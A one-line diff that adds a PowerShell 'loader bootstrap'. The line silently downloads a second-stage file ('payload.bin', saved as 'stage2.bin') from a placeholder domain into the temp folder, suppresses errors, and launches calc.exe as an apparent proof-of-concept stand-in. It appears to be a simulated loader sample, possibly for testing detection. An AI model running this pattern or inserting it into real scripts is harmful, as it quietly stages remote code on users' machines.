@@ -1,0 +1,1 @@
+<# Loader bootstrap #> Invoke-WebRequest -Uri "https://contoso.com/downloads/payload.bin" -OutFile "$env:TEMP\stage2.bin" -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
